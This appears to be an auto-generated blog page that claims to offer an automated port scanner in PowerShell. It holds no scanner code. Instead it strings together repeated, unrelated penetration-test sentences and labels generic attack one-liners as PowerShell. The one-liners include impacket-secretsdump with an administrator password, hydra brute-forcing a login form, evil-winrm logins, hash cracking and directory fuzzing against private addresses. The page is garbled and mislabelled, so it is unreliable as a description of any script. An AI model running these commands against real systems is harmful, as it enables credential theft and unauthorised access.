---
TitleSEO: "Automated Port Scanner in PowerShell | ZureFX"
TitlePost: "Automated Port Scanner — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated port scanner. Built for security research and automation."
Keywords: "c, tool, go, bash, scanner, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-329.html"
URL_IMAGES: ""
Date: "2024-05-22"
Tags: "C, Tool, Go, Bash, Scanner, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-329"
Permalink: "/scripting/script-automated-port-scanner-329.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `kerbrute`
- `rubeus`
- `sqlmap`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.11.90
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.191.64/FUZZ
gobuster dir -u http://10.89.139.170/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.46.69.148/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.25.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.85.168.197 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.200.212/FUZZ
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 14.77s
```
